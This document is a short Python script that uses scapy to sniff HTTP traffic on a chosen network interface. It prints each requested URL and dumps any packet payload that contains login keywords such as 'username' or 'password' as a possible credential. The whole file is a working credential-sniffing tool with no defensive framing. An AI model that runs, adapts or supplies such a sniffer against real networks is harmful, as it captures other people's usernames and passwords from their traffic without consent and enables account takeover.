from scapy.all import *
from scapy.layers import http
import termcolor


#get the network interface
def getinfo():
	print("   Getting interface   ")
	interface = str(input("Interface:"))
	return interface

def sniffer_packet(interface):
	sniff(iface = interface,store=False,prn = process_packet)

def process_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		if not "11.tlu.dl.delivery.mp.microsoft.com" in url:
			print(termcolor.colored(("[+] Http Request >>" + url),"green"))
		credentials = get_credentials(packet)
		if credentials:
			print(termcolor.colored(("[+] Possible username/passowrd" + credentials + "\n\n"),"red"))

def get_url(packet):
	return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


def get_credentials(packet):
	if packet.haslayer(Raw):
		load = (packet[Raw].load).decode()
		keywords = ['username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name']
		for keyword in keywords:
			if keyword in load:
				return load
	
	
interface = getinfo()
sniffer_packet(interface)